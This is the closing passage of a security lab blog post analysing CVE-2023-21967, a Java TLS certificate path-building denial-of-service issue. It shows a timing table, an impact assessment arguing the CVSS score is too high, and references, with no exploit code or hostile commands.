    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: right">3</td>
      <td style="text-align: right">6</td>
      <td style="text-align: right">262</td>
      <td style="text-align: right">133</td>
      <td style="text-align: right">17</td>
      <td style="text-align: right">6</td>
    </tr>
    <tr>
      <td style="text-align: right">4</td>
      <td style="text-align: right">12</td>
      <td style="text-align: right">565</td>
      <td style="text-align: right">137</td>
      <td style="text-align: right">167</td>
      <td style="text-align: right">17</td>
    </tr>
    <tr>
      <td style="text-align: right">5</td>
      <td style="text-align: right">20</td>
      <td style="text-align: right">779</td>
      <td style="text-align: right">150</td>
      <td style="text-align: right">849</td>
      <td style="text-align: right">66</td>
    </tr>
    <tr>
      <td style="text-align: right">6</td>
      <td style="text-align: right">30</td>
      <td style="text-align: right">1137</td>
      <td style="text-align: right">185</td>
      <td style="text-align: right">2843</td>
      <td style="text-align: right">327</td>
    </tr>
    <tr>
      <td style="text-align: right">7</td>
      <td style="text-align: right">42</td>
      <td style="text-align: right">2027</td>
      <td style="text-align: right">253</td>
      <td style="text-align: right">7443</td>
      <td style="text-align: right">1238</td>
    </tr>
    <tr>
      <td style="text-align: right">8</td>
      <td style="text-align: right">56</td>
      <td style="text-align: right">3918</td>
      <td style="text-align: right">382</td>
      <td style="text-align: right">16527</td>
      <td style="text-align: right">3621</td>
    </tr>
    <tr>
      <td style="text-align: right">9</td>
      <td style="text-align: right">72</td>
      <td style="text-align: right">9643</td>
      <td style="text-align: right">613</td>
      <td style="text-align: right">32777</td>
      <td style="text-align: right">8802</td>
    </tr>
    <tr>
      <td style="text-align: right">10</td>
      <td style="text-align: right">90</td>
      <td style="text-align: right">15304</td>
      <td style="text-align: right">1028</td>
      <td style="text-align: right">59699</td>
      <td style="text-align: right">18731</td>
    </tr>
    <tr>
      <td style="text-align: right">20</td>
      <td style="text-align: right">380</td>
      <td style="text-align: right">N/A</td>
      <td style="text-align: right">62444</td>
      <td style="text-align: right">N/A</td>
      <td style="text-align: right">1494561</td>
    </tr>
  </tbody>
</table>

<p>In addition to the previously documented proof of concept scenarios, we also tested the situation where the server was 
not expecting client certificates but was provided them anyway, noting no impact.</p>

<h2 id="impact">Impact</h2>

<p>Triggering a hang from this condition in the wild is not impossible but unlikely, as the default values of
<code class="language-plaintext highlighter-rouge">jdk.tls.maxCertificateChainLength</code> and <code class="language-plaintext highlighter-rouge">jdk.tls.maxHandshakeMessageSize</code> set fairly safe boundaries. With this in
mind, a CVSS rating of 5.9 is likely too high. Better information in the CVE description detailing exploitability
and configuration would further enable the community to evaluate the overall risk of this type of vulnerability.</p>

<h2 id="final-thoughts">Final Thoughts</h2>

<p>Reviewing actual code changes and building our own test cases provide useful context about the nature of a CVE. In this
case, we are fairly confident that CVE-2023-21967 targets improvements in the certificate path building algorithm. The 
patch implements recommendations for optimizing certification path building algorithm described in <a href="https://datatracker.ietf.org/doc/html/rfc4158">RFC 4158</a> 
from 2005. Without this patch, excessive resources could be spent during path building of complex PKI structures.</p>

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>https://web.archive.org/web/20230921210434/https://nvd.nist.gov/general/nvd-dashboard <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Oracle+Java+SE <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-21967 <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:4" role="doc-endnote">
      <p>https://bugs.openjdk.org/browse/JDK-8219022 <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:10" role="doc-endnote">
      <p>https://datatracker.ietf.org/doc/html/rfc8446#section-4.4.2 <a href="#fnref:10" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:8" role="doc-endnote">
      <p>https://docs.oracle.com/javase/8/docs/technotes/guides/security/jsse/JSSERefGuide.html <a href="#fnref:8" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:9" role="doc-endnote">
      <p>https://www.oracle.com/java/technologies/javase/11all-relnotes.html <a href="#fnref:9" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

        
      </section>

      <footer class="page__meta">
        
        
      </footer>

      

      
    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <style>
  .page__footer {
    background-color: rgb(255, 255, 255);
    font-family: GilroyRegular, -apple-system, "system-ui", "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
  }

  div#footer {
    border-top: 1px solid #bfbfbf;
    margin-top: 0px;
  }

  .footer__inner-wrap {
    box-sizing: border-box;
    clear: both;
    color: rgb(0, 0, 0);
    display: flex;
    font-family: -apple-system, "system-ui", Roboto, "Segoe UI", "Helvetica Neue", "Lucida Grande", Arial, sans-serif;
    font-size: 1rem;
    height: 137.328px;
    justify-content: space-between;
    line-height: 1.2rem;
    margin-left: 0px;
    margin-right: 0px;
    max-width: 100%;
    padding-bottom: 20px;
    /*padding-left: 20px;
    padding-right: 20px;*/
    padding-top: 20px;
    text-size-adjust: 100%;
  }

  .col-12 {
    box-sizing: border-box;
    color: rgb(0, 0, 0);
    display: block;
    flex-basis: 100%;
    flex-grow: 0;
    flex-shrink: 0;
    float: none;
    font-family: GilroyRegular, -apple-system, "system-ui", "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
    font-feature-settings: normal;
    font-kerning: auto;
    font-optical-sizing: auto;
    font-size: 0.5rem;
    font-stretch: 100%;
    font-style: normal;
    font-variant-alternates: normal;
    font-variant-caps: normal;
    font-variant-east-asian: normal;
    font-variant-ligatures: normal;
    font-variant-numeric: normal;
    font-variation-settings: normal;
    font-weight: 400;
    /* height: 864px; */
    letter-spacing: normal;
    line-height: 15px;
    margin-bottom: 0px;
    margin-left: 0px;
    margin-right: 0px;
    margin-top: 0px;
    max-width: 1700px;
    min-height: 1px;
    padding-bottom: 0px;
    padding-left: 40px;
    padding-right: 40px;
    padding-top: 0px;
    position: relative;
    text-align: left;
    text-size-adjust: 100%;
    /* width: 1293px; */
    -webkit-box-flex: 0;
    -webkit-font-smoothing: antialiased;
    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
  }

  .row {
    color: rgb(0, 0, 0);
  }

  .logo-tagline-container {
    padding-left: 0;
    padding-right: 0;
    margin-left: 0px;
    margin-top: 0px;
    /*margin-bottom: 12px;*/
    line-height: 1.5;
    display: inline-block;
    text-align: center;
    color: rgb(0, 0, 0);
    font-family: GilroyRegular, "Century Gothic", CenturyGothic, Arial, Helvetica, sans-serif;
    font-weight: bold;
    font-feature-settings: normal;
    font-kerning: auto;
    font-optical-sizing: auto;
    font-size: 0.8rem;
    font-stretch: 100%;
    font-style: normal;
    font-variant-alternates: normal;
    font-variant-caps: normal;
    font-variant-east-asian: normal;
    font-variant-ligatures: normal;
    font-variant-numeric: normal;
    font-variation-settings: normal;
    font-weight: 500;
  }

  @media screen and (width < 725px) {
    .logo-tagline-container {
      margin-left: auto;
      margin-right: auto;
      display: block;
    }
  }
  .logo-tagline-container img {
    height: 1.2rem;
    /*min-width: 8rem;*/
    /*width: 118px;*/
    padding-bottom: 8px;
    margin-bottom: 0px;
    /*margin-right: -1rem;
    margin-left: -1rem;*/
  }

  .logo_site_title {
    border-left: 1px solid var(--brand-gray);
    font-family: GilroyRegular, "Century Gothic", CenturyGothic, Arial, Helvetica, sans-serif;
    font-weight: bold;
    margin-left: 3px;
    padding-left: 10px;
    padding-right: 4px;
  }

  .logo_site_tagline {
    background-color: var(--brand-infinite-blue);
    color: var(--brand-wasabi-green);
    border-left: 1px solid var(--brand-gray);
    font-family: GilroyRegular, "Century Gothic", CenturyGothic, Arial, Helvetica, sans-serif;
    font-weight: normal;
    font-size: 0.8rem;
    margin-left: 10x;
    padding-left: 10px;
  }

  /*no idea what this was intended for*/
  /*links {
    border: 1px solid #e1e1e1;
    border-left: unset;
    border-right: unset;
    margin: 33px -15px 40px;
    padding: 40px 0 0;
  }*/

  ul.footer-visible-links {
    margin-bottom: 20px;
    margin-top: 0;
    padding-left: 0;
    flex: 0 0 100%;
    max-width: 100%;
  }

  .footer__menu-item-link {
    clear: unset;
    float: unset;
    margin-right: 24px;
  }

  .page__footer-nav {
    font-size: 0.6rem;
    font-family: GilroyRegular, "Century Gothic", CenturyGothic, Arial, Helvetica, sans-serif;
    font-weight: regular;

  }

  .page__footer-copyright {
    font-size: 0.6rem;
  }

  .footer-visible-links {
    display: flex;
    text-align: left;
    font-size: 0.6rem;
    align-items: left;
    -webkit-box-pack: end;
    -ms-flex-pack: end;
    /*justify-content: left;*/
    -webkit-box-flex: 1;
    -ms-flex: 1;
    /*flex: 1;*/
    overflow: hidden;
  }

  .footer__menu-item a {
    display: block;
    list-style-type: none;
    white-space: nowrap;
    font-size: 0.6rem;
    margin-top: 0px;
    margin-left: 0px;
    /*margin-bottom: 20px;*/
  }
</style>


<div id="footer-container">
  <div class="footer__inner-wrap">
    <div class="masthead__menu">
      <div class="logo-tagline-container">
        
        <img src="/assets/images/servicenow-header-logo.svg" alt="Security Lab">
        
        <span class="logo_site_title">Security Lab</span>
        <span class="logo_site_tagline">Keeping your workflows secure.</span>
      </div>
      <nav id="footer-site-nav" class="page__footer-nav">
        <ul class="footer-visible-links"><li class="footer__menu-item">
            <a class="footer__menu-item-link" href="https://www.servicenow.com/terms-of-use.html"  target="_blank">Terms and conditions</a>
          </li><li class="footer__menu-item">
            <a class="footer__menu-item-link" href="https://www.servicenow.com/company/trust/privacy/gdpr.html"  target="_blank">GDPR</a>
          </li><li class="footer__menu-item">
            <a class="footer__menu-item-link" href="https://www.servicenow.com/privacy-statement.html"  target="_blank">Privacy statement</a>
          </li><li class="footer__menu-item">
            <a class="footer__menu-item-link" href="/data-collection"  target="_blank">Data collection</a>
          </li><li class="footer__menu-item">
            <a class="footer__menu-item-link" href="mailto:securitylab@servicenow.com?subject=Security%20Lab%20Site%20Contact"  target="_blank">Contact Us</a>
          </li><li class="footer__menu-item">
            <a class="footer__menu-item-link" href="https://twitter.com/SNSecurityLab"  target="_blank">Twitter</a>
          </li></ul>
      </nav>
      <div class="page__footer-copyright">&copy; 2024 ServiceNow, Inc. All
        rights reserved.</div>
    </div>
  </div>
</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
